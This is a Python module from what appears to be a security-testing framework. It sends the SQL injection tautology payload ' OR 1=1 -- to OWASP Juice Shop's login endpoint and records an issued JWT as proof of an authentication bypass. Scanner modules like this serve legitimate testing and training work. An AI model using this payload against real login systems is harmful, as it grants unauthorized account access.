from __future__ import annotations

import requests

from ..core.base_module import BaseModule
from ..core.models import FindingResult, Severity

# Classic tautology-based SQLi auth-bypass against Juice Shop's login endpoint.
# Juice Shop uses a SQLite backend, so ' OR 1=1-- is a reliable trigger.
_PAYLOAD = "' OR 1=1 --"
_ENDPOINT = "/rest/user/login"


class SQLInjectionModule(BaseModule):
    technique_id = "T1190"
    technique_name = "Exploit Public-Facing Application (SQLi)"
    owasp_category = "A03:2021-Injection"
    severity = Severity.CRITICAL
    cvss_score = 9.8

    def execute(self) -> FindingResult:
        self.log.info("Probing %s with SQLi tautology payload", _ENDPOINT)
        resp, elapsed, error = self._request(
            "POST",
            _ENDPOINT,
            json={"email": _PAYLOAD, "password": "irrelevant_test_value"},
        )
        result = self._build_result(_PAYLOAD, _ENDPOINT, resp, elapsed, error)

        # Juice Shop returns a token on successful bypass — surface that as evidence
        if resp and resp.status_code == 200:
            try:
                body = resp.json()
                if "authentication" in body and "token" in body["authentication"]:
                    result.evidence = "JWT token issued — unauthenticated login succeeded via SQLi bypass."
            except Exception:
                pass

        return result
